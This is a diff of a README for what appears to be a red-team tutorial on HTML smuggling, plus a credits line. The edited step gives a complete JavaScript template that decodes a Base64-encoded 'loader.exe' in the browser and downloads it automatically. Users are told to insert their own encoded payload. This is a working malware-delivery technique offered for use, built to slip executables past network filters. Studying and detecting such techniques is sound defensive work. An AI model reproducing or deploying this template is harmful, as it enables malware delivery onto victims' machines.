@@ -76,12 +76,24 @@ base64 -w 0 loader.exe > loader
 
 ### 8. Build the HTML Smuggling Page
 
-Create an `.html` file to reconstruct and trigger the download of the binary:
+Use the provided `index.html` as a template. This file includes a complete HTML smuggling example with a styled interface and embedded Base64 execution logic.
+
+Replace the placeholder content in the script with your Base64-encoded payload (from step 7).
 
 ```html
 <script>
-let b64 = "YOUR_BASE64_HERE";
-let blob = new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))]);
+function base64ToArrayBuffer(base64) {
+  var binary_string = window.atob(base64);
+  var len = binary_string.length;
+  var bytes = new Uint8Array(len);
+  for (var i = 0; i < len; i++) {
+    bytes[i] = binary_string.charCodeAt(i);
+  }
+  return bytes.buffer;
+}
+
+var file = "YOUR_BASE64_HERE";  // Replace this with your base64-encoded loader
+let blob = new Blob([base64ToArrayBuffer(file)]);
 let a = document.createElement("a");
 a.href = URL.createObjectURL(blob);
 a.download = "loader.exe";
@@ -97,5 +109,5 @@ a.click();
 ## 👨‍💻 Credits
 
 Presented by: **Milton Silva**  
-Security Researcher
+Cybersecurity Team Leader at Visionware  
 [LinkedIn](https://www.linkedin.com/in/milton-araujo)
